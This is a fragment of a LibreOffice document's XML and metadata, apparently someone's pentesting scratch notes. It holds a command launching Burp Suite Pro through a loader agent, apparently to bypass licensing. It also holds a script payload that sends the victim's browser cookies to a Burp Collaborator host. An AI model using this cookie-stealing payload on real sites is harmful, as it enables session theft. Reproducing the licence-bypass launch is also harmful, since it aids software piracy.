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  <style:text-properties officeooo:paragraph-rsid="001783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java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:/home/_404/BurpSuitePro/loader.jar -noverify -jar /home/_404/BurpSuitePro/burpsuite_pro.jar &amp;</text:span></text:p>
      <text:p text:style-name="Standard"><text:bookmark-start text:name="__DdeLink__19_194951123"/><text:bookmark-start text:name="__DdeLink__16_194951123"/>&lt;script type="text/javascript"&gt;<text:line-break/>document.location='d7lzgu1cb1qp3slzqf2qi67du40vok.burpcollaborator.net'+document.cookie;<text:line-break/>&lt;/script&gt;<text:bookmark-end text:name="__DdeLink__19_194951123"/><text:bookmark-end text:name="__DdeLink__16_19495112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9T17:11:35.758846783</meta:creation-date>
    <dc:date>2022-05-29T22:50:32.326094057</dc:date>
    <meta:editing-duration>PT4H48M36S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="2" meta:word-count="13" meta:character-count="285" meta:non-whitespace-character-count="275"/>
    <meta:generator>LibreOffice/7.3.1.3$Linux_X86_64 LibreOffice_project/30$Build-3</meta:generator>
  </office:meta>
</office:document-meta>
</file>